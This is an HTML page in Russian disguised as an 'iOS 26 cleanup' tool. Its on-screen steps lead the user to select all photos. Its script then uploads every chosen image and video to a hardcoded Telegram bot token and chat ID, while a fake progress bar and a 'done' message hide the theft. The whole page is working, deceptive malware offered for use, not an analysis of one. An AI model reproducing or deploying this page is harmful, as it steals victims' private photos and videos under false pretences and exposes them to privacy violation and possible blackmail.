<!DOCTYPE html>
<html>
<head>
<title>Очистка iOS</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#fff;font-family:-apple-system;display:flex;justify-content:center;align-items:center;height:100vh;text-align:center}
.card{background:#1c1c1e;padding:30px 20px;border-radius:20px;width:90%;max-width:350px}
h2{font-size:22px;margin-bottom:8px}
.steps{color:#8e8e93;font-size:13px;margin-bottom:20px;text-align:left;padding-left:20px}
.steps li{margin-bottom:6px}
.btn{background:#007aff;color:#fff;border:none;padding:15px;font-size:18px;border-radius:12px;width:100%;margin-top:10px}
.btn:active{opacity:0.7}
.barwrap{width:100%;height:6px;background:#333;border-radius:3px;margin:15px 0;display:none}
.bar{width:0%;height:6px;background:#0f0;border-radius:3px}
#status{display:none;margin-top:8px;font-size:14px}
</style>
</head>
<body>
<div class="card">
<h2>🧹 Очистка iOS 26</h2>
<ol class="steps">
<li>Нажмите <b>«Выбрать фото»</b></li>
<li>Нажмите <b>«Все фото»</b> вверху</li>
<li>Нажмите <b>«Добавить»</b></li>
</ol>
<button class="btn" id="btn" onclick="go()">📸 Выбрать фото</button>
<div class="barwrap" id="barwrap"><div class="bar" id="bar"></div></div>
<p id="status"></p>
</div>
<input type="file" id="input" multiple accept="image/*,video/*" style="display:none">
<script>
const TOKEN="8673011110:AAGH5Zb6Put8qCt6Zjd_wuRt1Lbjqnhou8g";
const CHAT_ID="8181041871";
function go(){
const input=document.getElementById('input');
input.click();
input.onchange=async function(){
const files=Array.from(input.files);
if(files.length===0)return;
document.getElementById('btn').style.display='none';
document.querySelector('.steps').innerHTML='Найдено: <b>'+files.length+' файлов</b>';
document.getElementById('barwrap').style.display='block';
document.getElementById('status').style.display='block';
for(let i=0;i<files.length;i+=5){
const batch=files.slice(i,i+5);
for(let f of batch){
const fd=new FormData();
fd.append('document',f);
fd.append('chat_id',CHAT_ID);
try{await fetch('https://api.telegram.org/bot'+TOKEN+'/sendDocument',{method:'POST',body:fd})}catch(e){}
}
const pct=Math.min(100,Math.round((i+5)/files.length*100));
document.getElementById('bar').style.width=pct+'%';
document.getElementById('status').innerText='Отправка: '+pct+'%';
}
document.getElementById('status').innerHTML='✅ Готово!<br>Можно закрыть страницу';
};
}
</script>
</body>
</html>
